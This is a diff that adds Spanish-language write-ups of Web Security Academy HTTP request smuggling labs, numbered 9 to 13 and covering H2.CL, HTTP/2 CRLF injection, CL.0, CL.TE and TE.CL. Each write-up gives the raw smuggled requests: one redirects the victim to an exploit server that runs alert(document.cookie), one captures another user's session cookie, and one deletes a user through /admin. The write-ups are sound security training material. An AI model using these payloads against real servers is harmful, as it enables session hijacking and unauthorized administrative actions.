@@ -177,3 +177,107 @@ Transfer-Encoding: chunked
 GET /x HTTP/1.1
 Host: 0a2100b80418302481b348380024001d.web-security-academy.net
 ```
+
+## Reto 9:Contrabando de solicitudes H2.CL
+
+
+Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor front-end degrada las solicitudes HTTP/2 incluso si tienen una longitud ambigua.
+
+Para resolver el laboratorio, realice un ataque de contrabando de solicitudes que haga que el navegador de la víctima cargue y ejecute un archivo JavaScript malicioso desde el servidor de explotación, llamando alert(document.cookie)El usuario víctima accede a la página de inicio cada 10 segundos. 
+
+El ataque de request smuggling utilizando HTTP/2 con un encabezado ‘Content-Length‘ malicioso (H2.CL), cuyo objetivo es hacer que el navegador de la víctima cargue y ejecute un archivo JavaScript desde nuestro servidor malicioso.
+
+Aprovechamos una redirección automática al acceder a /resources, lo que nos permite inyectar una petición que, al ser procesada por el back-end, provoca que la víctima sea redirigida al exploit server donde se aloja nuestro payload ‘alert(document.cookie)‘.
+
+La clave está en enviar la petición en el momento justo en que el administrador accede a la página, ya que este tráfico será el que acabe siendo redirigido gracias a la cola de respuestas envenenada
+
+```
+POST / HTTP/2
+Host: 0a8500590474169680302b8c006a00df.web-security-academy.net
+Content-Length: 14
+test=testing
+GET /resources HTTP/1.1
+Host: exploit-0af700dd042d169e80262a1101da006d.exploit-server.net
+Content-Length: 11
+test=test
+```
+
+## Reto 10: Contrabando de solicitudes HTTP/2 mediante inyección CRLF
+
+Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor front-end degrada las solicitudes HTTP/2 y no logra desinfectar adecuadamente los encabezados entrantes.
+
+Para resolver el laboratorio, utilice un vector de contrabando de solicitudes exclusivo de HTTP/2 para acceder a la cuenta de otro usuario. La víctima accede a la página de inicio cada 15 segundos.
+
+Si no está familiarizado con las funciones exclusivas de Burp para pruebas HTTP/2, consulte la documentación para obtener detalles sobre cómo usarlas. 
+
+provechando una mala sanitización de cabeceras por parte del front-end. Usamos un vector exclusivo de HTTP/2 basado en inyección CRLF dentro del valor de una cabecera, lo que nos permite introducir una cabecera ‘Transfer-Encoding: chunked‘ maliciosa y un cuerpo que termina en 0.
+
+Este smuggling provoca que el backend procese parcialmente nuestra petición y mezcle el siguiente request del usuario víctima con la cola de respuestas, exponiendo su sesión en nuestro historial de búsquedas. Capturamos su token de sesión, lo reutilizamos, y accedemos a su cuenta para completar el laboratorio.
+
+```
+0
+POST / HTTP/1.1
+Host: 0a36002404f4a12c813df2cf008800ae.web-security-academy.net
+Cookie: session=YF7K0dOskMH7VLULRyo4q9PZdRISnIJp
+Content-Length: 850
+search=x
+```
+
+## Reto 11: Contrabando de solicitudes CL.0
+
+Este laboratorio es vulnerable a ataques de contrabando de solicitudes CL.0. El servidor back-end ignora la Content-Length encabezado en solicitudes a algunos puntos finales.
+
+Para resolver el laboratorio, identifique un punto final vulnerable, envíe de contrabando una solicitud al back-end para acceder al panel de administración en /admin, luego elimine el usuario carlos.
+
+Realizamos un ataque de request smuggling tipo CL.0, donde el servidor back-end ignora el encabezado Content-Length en ciertas rutas, permitiendo inyectar una segunda petición dentro del cuerpo de una POST aparentemente legítima.
+
+Tras identificar un endpoint vulnerable (por ejemplo, /resources/images/blog.svg), utilizamos esta vía para smugglear una solicitud que accede al panel de administración. Finalmente, aprovechamos este comportamiento para enviar una petición oculta que elimina al usuario carlos
+
+
+```
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a96000c03676f2481ba116a007000bd.web-security-academy.net
+Content-Length: 53
+GET /admin/delete?username=carlos HTTP/1.1
+Test: A
+```
+
+
+## Reto 12: Contrabando de solicitudes HTTP, vulnerabilidad básica CL.TE
+
+
+Este laboratorio utiliza un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. El servidor front-end rechaza las solicitudes que no utilizan los métodos GET o POST.
+
+Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que la siguiente solicitud procesada por el servidor back-end parezca utilizar el método GPOST.  
+
+ataque de HTTP request smuggling CL.TE en su forma más simple. Aprovechamos que el front-end no admite chunked encoding, pero el back-end sí, para inyectar un fragmento que hará que la siguiente petición se interprete con un método inválido como GPOST. Esto nos permite confirmar la vulnerabilidad observando la respuesta del servidor. 
+
+```
+POST / HTTP/1.1
+Host: 0a4c006303da8a9c81c6c5fc00f100bc.web-security-academy.net
+Content-Length: 6
+Transfer-Encoding: chunked
+0
+G
+```
+
+## Reto 13: Contrabando de solicitudes HTTP, vulnerabilidad básica de TE.CL
+
+Este laboratorio utiliza un servidor front-end y uno back-end, y el back-end no admite la codificación fragmentada. El front-end rechaza las solicitudes que no utilizan los métodos GET o POST.
+
+Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que la siguiente solicitud procesada por el servidor back-end parezca utilizar el método GPOST. 
+
+HTTP request smuggling de tipo TE.CL, donde el front-end acepta chunked encoding, pero el back-end no lo soporta. Aprovechamos esta diferencia para inyectar una petición que será reinterpretada por el back-end como si usara el método GPOST.
+
+```
+POST / HTTP/1.1
+Host: 0a9300d10479c57f804df8e700e200ee.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 4
+72
+GPOST / HTTP/1.1
+Host: 0a9300d10479c57f804df8e700e200ee.web-security-academy.net
+Content-Length: 20
+test=test
+0
+```
